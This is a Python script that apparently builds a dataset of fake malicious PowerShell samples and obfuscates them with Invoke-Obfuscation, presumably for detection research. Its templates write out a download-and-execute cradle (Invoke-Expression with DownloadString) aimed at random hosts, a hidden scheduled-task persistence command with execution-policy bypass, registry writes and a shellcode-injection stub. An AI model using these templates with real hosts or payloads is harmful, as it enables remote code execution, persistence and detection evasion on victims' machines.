#Generates a powershell script from the set of random malicious commands
import random
import string
import pexpect
import os
import sys

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_random_text(min, max):
	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])

def get_random_word():
	return get_random_text(3,10)

def get_random_regkey():
	key_name = get_random_word()
	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
	return key_name, key_location

def get_random_shellcode():
	shellcode = ",".join([hex(random.randint(0,255)) for _ in range(150)])
	return shellcode

def remote_payload_cmd():
	dest = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + dest + "\") \n"

#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
def schtasks_persistence_cmd():
	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
	return cmd

def set_registry_key_cmd():
	cmd = "$code = \"" + get_random_text(50,100) + "\"\n"
	key_location, key_name = get_random_regkey()
	cmd += "Set-ItemProperty \"HKCU:\\" + key_location + "\\\" -Name " + key_name + " -Value " + "$code \n"
	return cmd

def inject_shellcode_cmd():
	cmd = "[Byte[]] $Shellcode = @(" + get_random_shellcode() + ") \n";
	cmd += "".join(open("./scripts/inject_shellcode.ps1").readlines())
	return cmd

# commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd, inject_shellcode_cmd]
commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd] # inject shellcode seems to be broken when we try to obfuscate it :c

def generate_script():
	script = ""
	script+= random.choice(commands)()
	#for f in [random.choice(commands) for _ in range(5)]:
		#script+=f()

	return script

def generate_raw(n):
	for i in range(n):
		script = generate_script()
		f = open(f"res/dataset-{i}-raw.ps1",'w')
		f.write(script)
		f.close()

invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","AST,ALL,1,HOME","STRING,ALL,1,HOME","ENCODING,ALL,1,HOME"]

def generate_obfs(n):
	print("Generating fake malicious powershell")
	generate_raw(n)

	print("Converting to obfuscated powershell")
	
	success = []
	failed = []
	succ_cmds = []
	failed_cmds = []
	for i in range(n):
		try:
			#obfs_commands = ",".join([random.choice(invoke_obfuscation_choices) for _ in range(random.randint(1,4))])
			obfs_commands = random.choice(invoke_obfuscation_choices)

			if(random.randint(0,1) == 0):
				obfs_commands+=",COMPRESS,ALL,1,HOME"

			obfs_commands+= ",OUT"
			print(f"Script #{i}/{str(n)}, commands for Invoke-Obfuscation = {obfs_commands}")
			p = pexpect.spawn(f"pwsh obfuscate.ps1 -Filename ./res/dataset-{str(i)}-raw.ps1 -Command {obfs_commands}")
			#p.logfile_read = open("log", 'w')
			p.expect_exact("Enter path for output file (or leave blank for default): ")
			p.sendline(f"./res/dataset-{str(i)}-obfs.ps1")
			#print("generated file?")
			#p.expect(pexpect.EOF)
			print("Done!")
			p.interact() #Meh it works
			success.append(str(i))
			succ_cmds.append(obfs_commands)

		except Exception as e:
			# print(e)
			failed.append(str(i))
			print(f"Obfuscation for script #{i} failed! Command = {obfs_commands}")
			failed_cmds.append(obfs_commands)
			continue

	print(f"Succeeded {str(len(success))}/{str(n)} | " + ",".join(success))

	for fail in failed:
		print(f"Deleting failed script {fail}")
		os.system(f"rm res/dataset-{str(fail)}-raw.ps1")

	print("succeded", succ_cmds)
	print("failed", failed_cmds)

generate_obfs(int(sys.argv[1]))